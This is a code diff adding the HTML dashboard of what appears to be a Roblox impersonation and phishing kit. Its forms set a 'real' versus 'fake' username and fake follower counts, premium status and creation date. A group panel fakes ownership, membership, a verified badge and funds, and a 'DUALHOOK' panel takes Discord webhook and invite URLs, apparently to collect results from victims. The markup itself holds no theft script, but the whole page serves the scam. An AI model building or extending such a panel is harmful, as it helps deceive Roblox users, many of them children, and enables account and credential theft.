@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en" class="dark bg-[#070707]">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Editor | Dashboard</title>
+    <meta name="description" content="Edit domain profile, group, and dualhook" />
+    <link rel="icon" href="/public/icon.svg" type="image/svg+xml" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        darkMode: "class",
+        theme: {
+          extend: {
+            fontFamily: {
+              sans: ['Geist', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+              mono: ['Geist Mono', 'ui-monospace', 'monospace'],
+            },
+          },
+        },
+      }
+    </script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script defer src="assets/main.js"></script>
+  </head>
+  <body class="bg-[#070707] font-sans antialiased text-neutral-200">
+    <div id="page" data-breadcrumb="Editor">
+      <div class="mx-auto max-w-3xl pt-2 sm:pt-6">
+        <!-- Editor card -->
+        <div class="relative rounded-2xl border border-white/[0.07] bg-white/[0.015] p-5 sm:p-8">
+          <!-- Top row: GAMES / INSIGHTS pills -->
+          <div class="flex items-start justify-between">
+            <button type="button" class="flex items-center gap-2 rounded-xl border border-white/[0.08] bg-white/[0.03] px-3.5 py-2 text-sm font-medium text-neutral-200 transition-colors hover:bg-white/[0.06]">
+              <span>GAMES</span>
+              <i data-lucide="gamepad-2" class="size-4 text-neutral-400"></i>
+            </button>
+            <div class="relative">
+              <span id="domain-code" class="absolute -right-1 -top-3 text-[11px] font-semibold tracking-wide text-neutral-400">PR</span>
+              <button type="button" class="flex items-center gap-2 rounded-xl border border-white/[0.08] bg-white/[0.03] px-3.5 py-2 text-sm font-medium text-neutral-200 transition-colors hover:bg-white/[0.06]">
+                <span>INSIGHTS</span>
+                <i data-lucide="settings" class="size-4 text-neutral-400"></i>
+              </button>
+            </div>
+          </div>
+
+          <!-- Tabs -->
+          <div class="mt-6 flex items-center justify-center gap-3">
+            <button type="button" data-tab="profile" class="relative rounded-full px-5 py-2 text-sm font-medium transition-colors">
+              PROFILE
+            </button>
+            <button type="button" data-tab="group" class="relative rounded-full px-5 py-2 text-sm font-medium transition-colors">
+              GROUP
+            </button>
+            <button type="button" data-tab="dualhook" class="relative rounded-full px-5 py-2 text-sm font-medium transition-colors">
+              DUALHOOK
+            </button>
+          </div>
+
+          <!-- PROFILE panel -->
+          <form data-panel="profile" class="mx-auto mt-8 max-w-xl space-y-5">
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-2">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">REAL USERNAME</label>
+                <input type="text" value="KevinoRBLX" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">FAKE USERNAME</label>
+                <input type="text" value="Roblox" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">DISPLAY NAME</label>
+                <input type="text" value="tester" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">PREMIUM</label>
+                <select class="w-full appearance-none rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50">
+                  <option>Yes</option>
+                  <option>No</option>
+                </select>
+              </div>
+            </div>
+
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-3">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">FRIENDS</label>
+                <input type="number" value="0" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">FOLLOWERS</label>
+                <input type="number" value="0" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">FOLLOWINGS</label>
+                <input type="number" value="0" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50" />
+              </div>
+            </div>
+
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-2">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">STATUS</label>
+                <select class="w-full appearance-none rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50">
+                  <option>In Game</option>
+                  <option>Online</option>
+                  <option>Offline</option>
+                </select>
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">CREATION DATE</label>
+                <div class="flex items-center gap-2 rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100">
+                  <i data-lucide="calendar" class="size-4 text-neutral-400"></i>
+                  <span>June 19th, 2026</span>
+                </div>
+              </div>
+            </div>
+
+            <div>
+              <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">DESCRIPTION</label>
+              <textarea rows="5" class="w-full resize-none rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50"></textarea>
+            </div>
+
+            <button type="submit" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.04] py-3 text-sm font-semibold text-neutral-50 transition-colors hover:bg-white/[0.08]">
+              Save Changes
+            </button>
+          </form>
+
+          <!-- GROUP panel -->
+          <form data-panel="group" class="mx-auto mt-8 hidden max-w-xl space-y-5">
+            <div>
+              <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">REAL GROUP URL</label>
+              <input type="text" value="https://www.roblox.com/communities/7/Group Name" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+            </div>
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-2">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">GROUP OWNER</label>
+                <input type="text" value="Unset" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">GROUP NAME</label>
+                <input type="text" value="Unset" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+            </div>
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-3">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">MEMBERS</label>
+                <input type="number" value="1" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">VERIFIED BADGE</label>
+                <select class="w-full appearance-none rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50">
+                  <option>No</option>
+                  <option>Yes</option>
+                </select>
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">FUNDS</label>
+                <input type="number" value="0" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors focus:border-red-500/50" />
+              </div>
+            </div>
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-2">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">GROUP DESCRIPTION</label>
+                <textarea rows="4" class="w-full resize-none rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50">Description Unset</textarea>
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">GROUP SHOUT</label>
+                <textarea rows="4" class="w-full resize-none rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50">Shout Unset</textarea>
+              </div>
+            </div>
+            <button type="submit" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.04] py-3 text-sm font-semibold text-neutral-50 transition-colors hover:bg-white/[0.08]">
+              Save Changes
+            </button>
+          </form>
+
+          <!-- DUALHOOK panel -->
+          <form data-panel="dualhook" class="mx-auto mt-8 hidden max-w-xl space-y-5">
+            <div class="grid grid-cols-1 gap-5 sm:grid-cols-2">
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">DIRECTORY NAME</label>
+                <input type="text" placeholder="Directory Name" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">DISPLAY NAME</label>
+                <input type="text" placeholder="Display Name" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">INVITE URL</label>
+                <input type="text" placeholder="Discord Invite URL" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+              </div>
+              <div>
+                <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">EMBED COLOR</label>
+                <div class="flex items-center gap-2 rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5">
+                  <input type="color" value="#ffffff" class="size-5 cursor-pointer rounded border-0 bg-transparent p-0" />
+                  <input type="text" value="#fff" class="w-full bg-transparent text-sm text-neutral-100 outline-none placeholder:text-neutral-600" />
+                </div>
+              </div>
+            </div>
+            <div>
+              <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">THUMBNAIL URL</label>
+              <input type="text" placeholder="Thumbnail URL" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+            </div>
+            <div>
+              <label class="mb-1.5 block text-xs font-medium tracking-wide text-neutral-400">WEBHOOK</label>
+              <input type="text" placeholder="Discord Webhook" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.03] px-3.5 py-2.5 text-sm text-neutral-100 outline-none transition-colors placeholder:text-neutral-600 focus:border-red-500/50" />
+            </div>
+            <button type="submit" class="w-full rounded-lg border border-white/[0.07] bg-white/[0.04] py-3 text-sm font-semibold text-neutral-50 transition-colors hover:bg-white/[0.08]">
+              Create
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
